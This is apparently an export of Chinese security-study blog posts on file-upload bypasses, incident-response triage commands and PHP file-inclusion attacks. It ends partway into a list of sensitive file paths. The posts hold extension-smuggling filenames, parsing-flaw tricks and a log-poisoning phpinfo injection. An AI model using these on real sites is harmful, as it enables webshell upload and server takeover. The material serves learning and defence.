    <url>/2023/05/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%BC%E8%BF%B0/</url>
    <content><![CDATA[<h2 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h2><p>文件上传<br>    初识<br>        意义<br>        危害<br>        查找&#x2F;判断方式<br>        注意点<br>        实际应用说明<br>    验证&#x2F;绕过<br>        前端<br>            JS类防护<br>        后端<br>            黑名单<br>                特殊解析后缀<br>                .htaccess解析<br>                大小写绕过<br>                点绕过<br>                空格绕过<br>                ::$$DATA绕过<br>                配合解析漏洞<br>                双后缀名绕过<br>            白名单<br>                MIME绕过<br>                %00截断：在url中%00表示ascii码的0，表示字符串结束。（php版本&lt;5.3.4吧）<br>                0x00截断<br>                0x0a截断<br>            内容及其他<br>                文件头检测<br>                二次渲染<br>                条件竞争<br>                突破getimagesize<br>                突破exif_imagetype<br>    漏洞&#x2F;修复<br>        解析漏洞<br>            IIS6&#x2F;7.X<br>            Apache<br>            Nginx<br>        CMS漏洞<br>            子主题 1<br>            子主题 2<br>            子主题 3<br>        其他漏洞<br>            编辑器漏洞<br>                fackeditor<br>                ewebeditor<br>                ckeditor<br>                kindedit<br>                …<br>            CVE漏洞<br>            安全修复<br>    WAF绕过<br>        safadog<br>        BT<br>        XXX云盾</p>
<p><strong>利用思路</strong></p>
<p>常规类</p>
<p>​	扫描获取上传</p>
<p>​	会员中心上传</p>
<p>​	后台系统上传</p>
<p>​	各种途径上传</p>
<p>CMS类</p>
<p>​	CMS源码</p>
<p>编辑器类</p>
<p>​	ckeditor</p>
<p>​    ewebeditor<br>​			ckeditor<br>​			kindedit</p>
<p>其他&#x2F;CVE</p>
<p>​	平台审计</p>
<p>​	第三方</p>
<h2 id="1-基础与过滤方式"><a href="#1-基础与过滤方式" class="headerlink" title="1.基础与过滤方式"></a>1.基础与过滤方式</h2><p>是什么：程序对文件的上传没有全面的限制，导致用户可以上传一些超越用户权限的一些文件，如木马,shell脚本,病毒等。</p>
<p>文件上传利用前提:1.能上传上去；2.文件能被解析；3.知道绝对<strong>路径</strong>且能访问 </p>
<p>危害：获取到网站权限，进而获取数据。即通过该漏洞上传webshell后门。</p>
<p>查找&#x2F;判断：1.目录扫描找到上传地址</p>
<p>​					2.会员中心</p>
<p>​					3.后台</p>
<p>​					4.白盒：拿到源代码找漏洞</p>
<p>注意点：拿到漏洞，要对漏洞类型进行区分</p>
<p>实际应用说明：上传后门脚本获取网站权限</p>
<h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><ul>
<li>常规文件上传地址的获取说明	：工具扫描</li>
<li>不同格式下的文件类型后门测试：这个要结合自己的木马类型，如果是php，你连接地址为..&#x2F;1.jpg，显示是不符合的。(.htacess另说)</li>
<li>配合解析漏洞下的文件类型后门测试本地文件：上传+解析漏洞</li>
<li>upload-labs</li>
<li>CMS&#x2F;CVE上传漏洞复现</li>
</ul>
<h2 id="2-后端黑名单绕过"><a href="#2-后端黑名单绕过" class="headerlink" title="2.后端黑名单绕过"></a>2.后端黑名单绕过</h2><p>文件上传常见验证方式：</p>
<p>后缀名：黑名单(明确不让上传的格式后缀)、白名单(允许可上传的格式后缀，相对来说安全性高点)</p>
<p>文件类型：MIME信息(Content-type的值)</p>
<p>文件头：内容头信息，如gif的文件头是GIF89a</p>
<h4 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例:"></a>演示案例:</h4><p>upload-labs:<strong>Pass 1-12</strong></p>
<p>简要上传表单代码分析解释 </p>
<blockquote>
<p>$_FILES[表单中参数名][文件自带属性如(name&#x2F;type&#x2F;size)]</p>
<p>$_FILES[‘myfile’][‘name’]</p>
<p>$_FILES[‘myfile’][‘size’]</p>
<p>$_FILES[‘myfile’][‘type’]</p>
</blockquote>
<blockquote>
<p>&lt;form …&gt;<br>    &lt;input class&#x3D;”input_file” type&#x3D;”file” name&#x3D;”myfile”&#x2F;&gt;<br>    …<br>&lt;&#x2F;form&gt;</p>
</blockquote>
<h2 id="3-内容逻辑数组绕过"><a href="#3-内容逻辑数组绕过" class="headerlink" title="3.内容逻辑数组绕过"></a>3.内容逻辑数组绕过</h2><h4 id="演示案例：-1"><a href="#演示案例：-1" class="headerlink" title="演示案例："></a>演示案例：</h4><ul>
<li>upload-labs:<strong>Pass 13-20</strong></li>
<li>CVE-2017-12615-上传-Tomcat</li>
<li>中间件解析漏洞+配合文件上传测试<ul>
<li>IIS-上传-解析-(panfei806)</li>
<li>Apache-上传-解析-vulhub</li>
<li>Nginx-上传-解析-vulhub</li>
</ul>
</li>
</ul>
<h4 id="中间件解析漏洞："><a href="#中间件解析漏洞：" class="headerlink" title="中间件解析漏洞："></a>中间件解析漏洞：</h4><p>解析漏洞<br>    Nginx<br>        xxx.jpg%00.php(Nginx&lt;8.03 空字节代码执行漏洞)<br>        fix_pathinfo<br>            &#x2F;1.jpg&#x2F;1.php<br>            &#x2F;1.jpg%00.php<br>            &#x2F;1.jpg&#x2F;%20\0.php<br>    IIS<br>        IIS5.x-IIS6.x<br>            &#x2F;xx.asp&#x2F;xx.jpg<br>            xx.asp;jpg<br>            test.asa test.cer test.cdx<br>        IIS7.5<br>            a.aspx.a;a.aspx.jog.jpg<br>    apache<br>        test.php.php123  从右到左开始判断解析<br>        AddHandler php5-script.php     test2.php.jpg<br>        AddType application&#x2F;x-httpd-php .jpg     即使扩展名是jpg,一样能以php方式执行</p>
]]></content>
      <categories>
        <category>web漏洞</category>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>应急响应</title>
    <url>/2023/06/07/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
    <content><![CDATA[<h1 id="1-应急响应是什么"><a href="#1-应急响应是什么" class="headerlink" title="1.应急响应是什么"></a>1.应急响应是什么</h1><p>指针对已经发生或可能发生的安全事件进行监控、分析、协调、处理、保护资产安全。主要是为了人们对网络安全有所认识、有所准备，以便在遇到突发网络安全事件时做到有序应对、妥善处理。</p>
<h1 id="2-PDCERF-6阶段"><a href="#2-PDCERF-6阶段" class="headerlink" title="2.PDCERF(6阶段)"></a>2.PDCERF(6阶段)</h1><ol>
<li><p>准备阶段：预防，扫描、风险分析、补丁；制定可以实现应急响应目标的策略和规程，建立能够集合起来处理突发事件的体系。</p>
<p><strong>准备用来检测的工具和人，比如说ls、losf、ss、ifconfig这些东西</strong></p>
</li>
<li><p>检测阶段：检测事件是已经发生的还是正在进行中的；找出事件产生原因，确定事件性质和严重性、预计修复时采用的专用资源</p>
<p><strong>紧急事件监测：包括防火墙、系统、web服务器、IDS&#x2F;WAF&#x2F;SIEM中的日志，不正常或者是执行了越权操作的用户，甚至还有管理员的报告（可以是邮件也可以电话短信什么的你可以看到听到的东西），我们要从这些数据中判断出受灾面积和攻击者入侵的点</strong></p>
</li>
<li><p>抑制阶段：限制被破坏的范围。策略：完全关闭所有系统；从网络上断开主机或断开网络部分；修改所有防火墙和路由器过滤规则；封锁或删除被攻击的登录账号；加强对系统和网络行为的监控；设置诱饵服务器进一步获取事件信息；关闭受攻击的系统或其它相关系统的部分服务。</p>
</li>
<li><p>根除阶段：:通过事件分析找出根源并彻底根除，以避免攻击者再次使用相同的手段攻击系统。</p>
</li>
<li><p>恢复阶段：把被破坏的信息彻底恢复到正常运作状态。</p>
</li>
<li><p>攻击跟踪：据各种监控去确定没有其他的攻击行为和攻击向量，紧接着就是开会反省此次事件，写报告，持续改进工作流程和工作缓解</p>
</li>
</ol>
<h1 id="3-评价安全标准"><a href="#3-评价安全标准" class="headerlink" title="3.评价安全标准"></a>3.评价安全标准</h1><p>评价企业安全建设做的好与坏的标准就是ROI（投资回报率），即攻击者攻击的成本是10元，你去防御这个攻击的成本是1毛，说明这个安全建设是有效的。</p>
<h1 id="4-SDL"><a href="#4-SDL" class="headerlink" title="4.SDL"></a>4.SDL</h1><p>security development lifecycle，即安全开发生命周期。</p>
<p>目的：从安全漏洞产生的根源上解决应用安全问题，通过对软件开发流程的控制，保证产品的安全性。</p>
<p>SDL是全面软件生命周期管理与最佳实践手段和工具相结合的产物，使用SDL方式可有效提升系统的安全等级，并将安全工作提升到可进行标准化实施的程度。微软的SDL理论基于三个核心概念开展：培训、持续的安全问题改进和问责制。SDL的目标是减少应用软件的漏洞数量级和严重程度，其完整生命周期主要阶段</p>
<p>SDL的第一步就是安全培训。</p>
<h2 id="安全培训内容"><a href="#安全培训内容" class="headerlink" title="安全培训内容"></a>安全培训内容</h2><p>Part 1：安全设计：包括减小攻击面、深度防御、最小权限原则、服务器安全配置等<br>Part 2：威胁建模：概述、设计意义、基于威胁建模的编码约束<br>Part 3：安全编码：缓冲区溢出（针对C&#x2F;C++）、整数算法错误（针对C&#x2F;C++）、XSS&#x2F;CSRF（对于Web类应用）、SQL注入（对于Web类应用）、弱加密<br>Part 4：安全测试：安全测试和黑盒测试的区别、风险评估、安全测试方法（代码审计、fuzz等）<br>Part 5：隐私与敏感数据：敏感数据类型、风险评估、隐私开发和测试的最佳实践<br>Part 6：高级概念：高级安全概念、可信用户界面设计、安全漏洞细节、自定义威胁缓解</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619214555452.png" alt="完整周期主要阶段"></p>
<h1 id="5-场景与处理流程"><a href="#5-场景与处理流程" class="headerlink" title="5.场景与处理流程"></a>5.场景与处理流程</h1><h2 id="1-场景"><a href="#1-场景" class="headerlink" title="1.场景"></a>1.场景</h2><p>勒索病毒、挖矿木马、Webshell、网页篡改、DDos攻击、数据泄露、流量劫持。</p>
<h2 id="2-处理流程"><a href="#2-处理流程" class="headerlink" title="2.处理流程"></a>2.处理流程</h2><p>事件类型</p>
<p>时间范围</p>
<h3 id="系统排查"><a href="#系统排查" class="headerlink" title="系统排查"></a>系统排查</h3><h4 id="a-系统基本信息"><a href="#a-系统基本信息" class="headerlink" title="a.系统基本信息"></a>a.系统基本信息</h4><p>windows</p>
<blockquote>
<p>msinfo32：系统信息，显示本地计算机的硬件资源、组件和软件环境信息。正在运行任务、服务、系统驱动程序、加载的模块、启动程序等进行排查。<br>systeminfo：系统信息，主机名、操作系统版本等详细信息。</p>
</blockquote>
<p>Linux</p>
<blockquote>
<p>lscpu：CPU信息，型号、主频、内核等。</p>
<p>uname -a：操作系统信息</p>
<p>cat &#x2F;proc&#x2F;version：操作系统版本信息</p>
<p>lsmod：所有载入系统的模块信息</p>
</blockquote>
<h4 id="b-用户信息"><a href="#b-用户信息" class="headerlink" title="b.用户信息"></a>b.用户信息</h4><p>windows</p>
<blockquote>
<p>net user：查看用户账户信息（看不到以$结尾的隐藏用户）<br>net user username：查看用户名为username用户的详细信息； lusrmgr.msc：打开本地用户与组，可查看隐藏用户；<br>打开计算机管理-本地用户与组可查看隐藏用户;</p>
<p>wmic useraccount get name,sid：查看系统中的所有用户；<br>注册表查看是否存在克隆账户：regedit打开注册表，选择HKEY_LOCAL_MACHHINE下的SAM选项，为该项添加允许父项的继承权限传播到该对象和所有子对象。包括那些在此明确定义的目标和用在此显示的可以应用到子对象的项目替代所有子对象的权限项目权限，使当前用户拥有SAM的读取权限。添加之后F5刷新即可访问子项并查看用户信息。同时，在此项下导出所有00000开头的项，将所有导出的项与000001F4（对应Administrator用户）导出内容做比较，若其中的F值相同，则表示可能为克隆账户。</p>
</blockquote>
<p>Linux</p>
<blockquote>
<p>查看所有用户信息：cat &#x2F;etc&#x2F;passwd<br>后续各项由冒号隔开，分别表示用户名、密码加密、用户ID、用户组ID、注释、用户主目录、默认登录shell。最后显示bin&#x2F;bash的，表示账户状态可登录，显示sbin&#x2F;nologin的，不可登陆。</p>
<p>awk -F: ‘{if($3&#x3D;&#x3D;0)print<br>$1}’ &#x2F;etc&#x2F;passwd ：查询登录账户UID&#x3D;0的账户，root是uid等于0的账户，如果出现其它的账户，就要重点排查；</p>
<p>查看可登录账户：cat &#x2F;etc&#x2F;passwd | grep ‘&#x2F;bin&#x2F;bash’</p>
<p>查看用户错误的登录信息：lastb（包括错误的登录方法、ip、时间等） </p>
<p>查看所有用户最后的登录信息：lastlog</p>
<p>查看用户最近登录信息：last </p>
<p>查看当前用户登录系统信息：who </p>
<p>查看空口令账户：awk -F: ‘length($2)&#x3D;&#x3D;0 {print$1}’ &#x2F;etc&#x2F;shadow</p>
</blockquote>
<h4 id="c-启动项"><a href="#c-启动项" class="headerlink" title="c.启动项"></a>c.启动项</h4><p>是开机系统在前台或者后台运行的程序，是病毒等实现持久化驻留的常用方法。</p>
<p>Windows</p>
<blockquote>
<p>msconfig：可查看启动项的详细信息；</p>
<p>注册表查看：</p>
<p>HKEY_CLASSES_ROOT:此处存储的信息可确保在windows资源管理器中执行时打开正确的程序。它还包含有关拖放规则、快捷方法和用户界面信息的更多详细信息；<br>HKEY_CURRENT_USER:包含当前登录系统的用户的配置信息，有用户的文件夹、屏幕颜色和控制面板设置；<br>HKEY_LOCAL_MACHINE:包含运行操作系统的硬件特定信息，有系统上安装的驱动器列表及已安装硬件和应用程序的通用配置；<br>HKEY_USERS：包含系统上所有用户的配置信息，有应用程序配置和可视配置；<br>HKEY_CURRENT_CONFIG:存储有关系统当前配置信息</p>
<p>查看注册表中的信息：reg query<br>“HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run”</p>
</blockquote>
<p>Linux</p>
<blockquote>
<p>cat &#x2F;etc&#x2F;init.d&#x2F;rc.local cat &#x2F;etc&#x2F;rc.local ls -alt &#x2F;etc&#x2F;init.d<br>查看init.d文件夹下的所有文件的详细信息</p>
</blockquote>
<h4 id="d-任务计划"><a href="#d-任务计划" class="headerlink" title="d.任务计划"></a>d.任务计划</h4><p>很多计算机都会自动加载“任务计划”，因此任务计划也是病毒实现持久化驻留的一种常用手段</p>
<p>Windows</p>
<blockquote>
<p>eventvwr：打开事件查看器，可看日志<br>打开计算机管理——系统工具——任务计划程序——任务计划程序库：可查看任务计划的名称、状态、触发器等信息；<br>命令行输入schtasks：可获取任务计划信息，要求是本地Administrator组的成员；<br>在PowerShell下输入get-scheduledtask 可查看当前系统中所有任务计划信息，包括路径、名称、状态等详细信息。</p>
</blockquote>
<p>Linux</p>
<blockquote>
<p>crontab -l：可查看当前任务计划 </p>
<p>crontab -u root -l：查看root用户的任务计划（指定用户）</p>
<p>查看etc目录下的任务计划文件：一般在linux系统中的任务计划文件是以cron开头的，可以利用正则表达式的筛选出etc目录下的所有以cron开头的文件，具体表达式为&#x2F;etc&#x2F;cron,例如查看etc目录下的所有任务计划文件就可以输入ls &#x2F;etc&#x2F;cron命令。<br>&#x2F;etc&#x2F;crontab<br>&#x2F;etc&#x2F;cron.d&#x2F;<br>&#x2F;etc&#x2F;cron.daily&#x2F;*<br>&#x2F;etc&#x2F;cron.hourly&#x2F;*<br>&#x2F;etc&#x2F;cron.monthly&#x2F;*<br>&#x2F;etc&#x2F;cron.weekly&#x2F;<br>&#x2F;etc&#x2F;anacrontab</p>
</blockquote>
<h4 id="e-其它"><a href="#e-其它" class="headerlink" title="e.其它"></a>e.其它</h4><p>windows防火墙的入站规则和出站规则 :</p>
<blockquote>
<p>netsh ：</p>
<p>netsh firewall show state:显示当前防火墙的网络配置状态</p>
</blockquote>
<p><img src="/../../../Typora/img111/image-20230615144413717.png" alt="netsh"></p>
<h3 id="进程排查"><a href="#进程排查" class="headerlink" title="进程排查"></a>进程排查</h3><p>进程即，系统进行资源分配和调度的基本单位；</p>
<p>主机在感染恶意程序后，恶意程序都会启动相应的进程，来完成相关的恶意操作，有的恶意进程为了不被查杀，还会启动相应的守护进程来对恶意进程进行守护。</p>
<p>Windows</p>
<blockquote>
<p>通过任务管理器查看;</p>
<p>命令行的话：</p>
<p>tasklist：可显示计算机中的所有进程，可查看进程的映像名称、PID、会话等信息；</p>
<p>tasklist &#x2F;svc：可以显示每个进程和服务对应的情况；</p>
<p> tasklist &#x2F;m：查询加载的DLL </p>
<p>tasklist &#x2F;m wmiutils.dll:查询特定dll的调用情况 </p>
<p>tasklist &#x2F;svc &#x2F;fi “pid eq 284”：过滤器功能，eq等于、nq不等于、gt大于、lt小于、ge大于等于、le小于等于</p>
</blockquote>
<blockquote>
<p>netstat：可显示网络连接的信息，包括活动的TCP连接、路由器和网络接口信息，是一个监控TCP&#x2F;IP网络的工具。<br>端口定位程序：通过netstat定位处PID，然后用tasklist查看具体的程序，</p>
<p>例如：netstat -ano |findstr “3306” </p>
<p>定位出pid&#x3D;6616: tasklist |find “6616” </p>
<p>netstat -anb 3306：端口快速定位程序，需要管理员权限；</p>
<p> powershell排查：对于有守护进程的进程，需要确认子父进程之间的关系<br>get-wmiobject win32_process | select<br>name,processid,parentprocessid,path<br>wmic命令查询：可对进程进行查询以csv格式来显示进程名称、父进程id、进程id </p>
<p>wmic process get<br>name,parentprocessid,processid（&#x2F;format:csv），实验了一下，括号可以去掉，否则提示此级别开关异常</p>
</blockquote>
<p>Linux</p>
<blockquote>
<p>netstat:分析可以端口、分析可疑ip地址、可疑pid及程序进程； </p>
<p>（待验证：↓）</p>
<p><strong>ls -alt &#x2F;proc&#x2F;PID：查看PID为600的进程可执行程序；</strong></p>
<p> <strong>lsof -p PID:查看进程所打开的文件；</strong></p>
<p> <strong>kill -9 PID：结束进程；</strong><br><strong>rm -rf filename ：删除名为filename的文件；</strong><br><strong>如果root用户都无法删除相关文件，可能是因为该文件被加上了i属性，使用lsattr filename 查看文件属性，然后用chattr -i filename 可移除i属性，进而删除文件。也有因为进程存在守护进程而无法被删除，可先将进程挂起，查杀守护进程后，再返回将进程删除。</strong></p>
<p><strong>补充：chattr +i filename 加i属性。</strong></p>
<p> <strong>查看隐藏进程：顺序执行以下三条命令</strong><br><strong>ps -ef | awk ‘{print}’|sort -n |uniq&gt;1 ls &#x2F;proc |sort -n |uniq&gt;2</strong><br><strong>diff 1 2 top：可用于挖矿进程排查，显示占用率较高的进程。</strong></p>
</blockquote>
<h3 id="服务排查"><a href="#服务排查" class="headerlink" title="服务排查"></a>服务排查</h3><p>运行在后台的进程，服务可以在计算机启动时自动启动，也可暂停和重启，而且不显示任何用户界面，服务非常适合在服务器上使用，通常在为了不影响在同一天计算机上工作的其它用户，且需要长时间运行功能时使用。在应急响应中，服务作为一种运行在后台的进程，是恶意软件常用的驻留方法。</p>
<p>Windows</p>
<blockquote>
<p>services.msc：打开服务窗口，查看所有的服务项，包括服务的名称、描述、状态等。</p>
</blockquote>
<p>Linux</p>
<blockquote>
<p>chkconfig –list：可查看系统运行的服务；<br>service –status-all：可查看所有服务的状态；</p>
</blockquote>
<h3 id="文件痕迹排查"><a href="#文件痕迹排查" class="headerlink" title="文件痕迹排查"></a>文件痕迹排查</h3><p>排查思路：</p>
<blockquote>
<ol>
<li>对恶意软件常用的敏感路径进行排查；</li>
<li>在确定了应急响应事件的时间点后，对时间点前后的文件进行排查；</li>
<li>对带有特征的恶意软件进行排查，包括代码关键字或关键函数、文件权限特征。</li>
</ol>
</blockquote>
<p>Windows</p>
<blockquote>
<p>敏感目录<br>各个盘下的temp(tmp)相关目录，有些恶意程序释放字体(即恶意程序运行时投放出的文件)一般会在程序中写好投放的路径，由于不同系统版本的路径有所差别，但临时文件的路径相对统一，因此在程序中写好的路径一般是临时路径；</p>
</blockquote>
<blockquote>
<p>查看浏览器历史记录、下载文件和cookie信息：攻击者可能会下载一些后续攻击工具；</p>
</blockquote>
<blockquote>
<p>查看用户Recent文件：存储最近运行文件的快捷方式，一般在windows中的路径为： C:\Document and<br>Settings\Administrator(系统用户名)\Recent C:\Document and Settings\Default<br>User\Recent<br>Prefetch：预读取文件夹，存放系统已经访问过的文件的读取信息，扩展名为pf，可加快系统启动进程，</p>
<p>启动：%systemroot%\prefetch amcache.hve:可查看应用程序执行路径、上次执行时间及sha1值。</p>
<p>启动：%systemroot%\appcompat\programs<br>时间点查找 forfiles 攻击者可能会对时间动手脚 webshell<br>D盾、HwsKill、WebshellKill等工具对目录下的文件进行规则查询，</p>
</blockquote>
<p>Linux</p>
<blockquote>
<p>敏感目录 &#x2F;tmp、 &#x2F;usr&#x2F;bin、 &#x2F;usr&#x2F;sbin：经常作为恶意软件下载目录及相关文件被替换的目录；<br>~&#x2F;.ssh、&#x2F;etc&#x2F;ssh：经常作为后门配置的路径</p>
</blockquote>
<blockquote>
<p>时间点查找 find：可对某一时间段内增加的文件进行查找；<br>stat：对文件的创建时间、修改时间、访问时间进行排查；</p>
</blockquote>
<blockquote>
<p>特殊文件<br>查找777权限的文件：find &#x2F;tmp -perm 777</p>
</blockquote>
<blockquote>
<p>webshell查找<br>初筛：find &#x2F;var&#x2F;www&#x2F; -name “*.php”<br>工具：findWebshell、Scan_Webshell.py扫描排查</p>
</blockquote>
<blockquote>
<p>对系统命令进行排查<br>ls、ps可能被攻击者替换，</p>
<p>ls -alt &#x2F;bin 查看命令目录中的系统命令的修改时间进行排查；<br>ls -alh &#x2F;bin：查看相关文件大小，若明显偏大，则文件很可能被替换；</p>
</blockquote>
<blockquote>
<p>linux后门检测<br>工具:chkrootkit（出现infected说明有后门）、rkhunter 排查suid程序<br>find &#x2F;-type f -perm -04000 -ls -uid 0 2 &gt;&#x2F;dev&#x2F;null</p>
</blockquote>
<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>Windows：</p>
<p>在运行对话框中输入eventvwr，打开事件查看器窗口，可查看windows相关日志。</p>
<blockquote>
<p>系统日志：%SystemRoot%\System32\Winevt\Logs\System.evtx 系统中的各个组件在运行中产生的各种事件</p>
</blockquote>
<blockquote>
<p>安全性日志:%SystemRoot%\System32\Winevt\Logs\security.evtx<br>记录各种安全相关的事件，登录操作、对系统文件进行创建、删除、更改等操作。</p>
</blockquote>
<blockquote>
<p>应用程序日志：%SystemRoot%\System32\Winevt\Logs\Application.evtx</p>
</blockquote>
<blockquote>
<p>日志常用事件id 4624：登陆成功 4625：登录失败</p>
</blockquote>
<blockquote>
<p>日志分析<br>日志筛选器进行分析<br>PowerShell分析 Get-WinEvent Get-WinEvent Security -InstanceId 4625:获取安全性日志下事件id为4625的所有日志信息。<br>使用工具</p>
</blockquote>
<p>Linux</p>
<p>linux系统日志一般在&#x2F;var&#x2F;log&#x2F;下</p>
<blockquote>
<p>&#x2F;var&#x2F;log&#x2F;wtmp：记录登录进入、退出、数据交换、关机和重启，及last</p>
<p>&#x2F;var&#x2F;log&#x2F;cron：记录与定时任务相关的日志信息；</p>
<p>&#x2F;var&#x2F;log&#x2F;message:记录系统启动后的信息和错误日志；</p>
<p>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log：记录apache的访问日志；</p>
<p>&#x2F;var&#x2F;log&#x2F;auth.log：记录系统授权信息，包括用户登录和使用的权限机制等；<br>…<br>日志分析<br>…<br>其它日志<br>除了windows、linux系统日志分析外，还有Web日志、中间件日志、数据库日志、FTP日志等进行分析。</p>
</blockquote>
<blockquote>
<p>IIS日志<br>%systemdrive%\inetpub\logs\logfiles<br>%systemroot%\system32\logfiles\w3svc1</p>
</blockquote>
<p>…</p>
<blockquote>
<p>Apache日志<br>&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access.log<br>&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log<br>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log<br>&#x2F;var&#x2F;log&#x2F;httpd-access.log</p>
</blockquote>
<blockquote>
<p>Nginx日志<br>默认在&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs目录下，access.log代表访问日志，error.log代表错误日志。若没在默认路径下，则可到nginx.conf配置文件中查找。</p>
</blockquote>
<blockquote>
<p>Tomcat日志 tomcat&#x2F;log下 Vsftp日志<br>&#x2F;var&#x2F;log&#x2F;messages 可通过编辑&#x2F;etc&#x2F;vsftp&#x2F;vsftp.conf配置文件来启用单独的日志，启用后，可访问vsftp.log和xferlog。</p>
</blockquote>
<blockquote>
<p>Weblogic日志<br>有三种日志：access log、 server log 、 domain log。</p>
</blockquote>
<blockquote>
<p>数据库日志</p>
<pre><code>        Oracle
            select * from v$logfile：查询日志命令，默认在$ORACLE/rdbms/log目录下，
            select * from v$sql：可查询之前使用的sql；
        Mysql
            默认路径：/var/log/mysql/
            可查看日志是否开启：show variables like &#39;general&#39;;
            开启日志：set global general_log = &#39;ON&#39;;
        Mssql
            一般无法查看，需要登录到SQL Server Management Studio,在管理——SQL Server日志 中查看。
</code></pre>
</blockquote>
<p>内存分析</p>
<p>流量分析</p>
<p>威胁情报</p>
<p>得出结论</p>
<h1 id="6-参考"><a href="#6-参考" class="headerlink" title="6.参考"></a>6.参考</h1><p><a href="https://blog.csdn.net/qq_45697116/article/details/125194266?ops_request_misc=%7B%22request_id%22:%22168679554016800186533333%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168679554016800186533333&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-125194266-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94&spm=1018.2226.3001.4187">网络安全应急响应(归纳)_003安全实验室的博客-CSDN博客</a></p>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含</title>
    <url>/2023/06/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><p>在编写含有大量交互功能的站点时，为了实现单一文件在不同页面的重复使用，通常利用文件包含的方式，将本地可被复用的文件利用包含函数在当前页面中执行。</p>
<p>如果某个页面具有这种功能，并且在这个包含的过程中，<strong>被包含的文件名可通过参数的方式被用户端控制</strong>，那么就可能存在文件包含漏洞。</p>
<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>文件包含漏洞是指当PHP函数引入文件时，没有合理校验传入的文件名，从而<strong>操作了预想之外的文件</strong>，导致意外的文件泄露甚至恶意的代码注入。PHP文件包含漏洞根据包含的内容来源分为<strong>本地</strong>文件包含漏洞（LFI）和<strong>远程</strong>文件包含漏洞（RFI）。文件包含漏洞在利用时能够打开并包含本地文件并可利用此类漏洞查看系统任意文件内容，如果具备一些条件，也可以执行命令。</p>
<p>在PHP环境下，可利用include、require、include_once、require_once函数调用文件，实现文件包含的效果。一般情况下，均会利用include实现对配置、通用函数的加载，实现代码的复用，并且可使站点的结构非常清晰。但在部分情况下会利用包含函数实现对特定文件的包含，如用户上传的文件需展示等。在这种情况下，包含函数所引用的文件地点及类型可被用户控制，从而产生了文件包含攻击的可能性。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>严格来说，文件包含漏洞是代码注入的一种，其原理就是<strong>注入一段用户能控制的脚本或代码，并让服务器端以某种方式执行用户传入参数。</strong>这就导致文件包含漏洞可被利用的一种方式为<strong>Web木马利用各种方式部署在服务器上</strong>，并且<strong>木马文件或源码可被攻击者利用包含函数打开</strong>，导致Web木马被执行，从而使攻击成功。</p>
<h2 id="条件利用"><a href="#条件利用" class="headerlink" title="条件利用"></a>条件利用</h2><p>攻击者要想成功利用文件包含漏洞进行攻击，必须要满足以下两个条件，才称得上存在文件包含漏洞：</p>
<p>1）Web应用采用include（）等文件包含函数，并且需要包含的文件路径是通过用户传输参数的方式引入。</p>
<p>2）用户能够控制包含文件的参数，且被包含的文件路径可被当前页面访问。</p>
<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>文件包含特点就是将服务器上的文件包含到当前的页面中。</p>
<p>因此，在利用方式上，重点需对可包含的文件进行分析，同时漏洞的危害由<strong>被包含文件</strong>的作用而决定。</p>
<h2 id="上传文件包含"><a href="#上传文件包含" class="headerlink" title="上传文件包含"></a>上传文件包含</h2><p>如果用户上传的文件内容中包含PHP代码，但无法直接执行，如果存在文件包含漏洞，就可以将代码由包含函数加载，执行代码。</p>
<p>当然，这取决于文件上传功能的设计：攻击者需知道<strong>上传文件存放的物理路径</strong>，还需要对<strong>上传文件所在的目录有执行权限</strong>。以上条件缺一不可，并且还需有<strong>文件包含的漏洞存在</strong>。</p>
<h2 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h2><p>向Web日志中插入PHP代码，通过文件包含漏洞来执行包含在Web日志中的PHP代码。</p>
<p>1.首先通过包含等各种方式获取日志文件位置。需要知道当前中间件存储错误日志的路径。</p>
<p>2.在URL中插入执行代码，将其记录进日志文件。注意，此处代码被转义。假设此处提交include_0.php？&lt;？php phpinfo（）；？&gt;.php时，在&lt;？php后面紧跟着的空格，如果被转义成%20，就会导致php代码执行失败。有时候，写进access.log文件里的还可能是将两个尖括号&lt;&gt;也转义了的。在实际测试中，用火狐、高版本IE浏览器都会转义，但是使用IE6不会转义。也可以使用Burpsuit抓包做修改，</p>
<p>**嘶，这一块没有代码，不好实现，先放一放。（什么日志文件会自动记录错误的url?**）</p>
<p>3.总之写进去了后，访问这个文件，就会出现phpinfo()的信息</p>
<p>常见敏感信息路径如下。</p>
<p>1.Windows系统</p>
<hr>
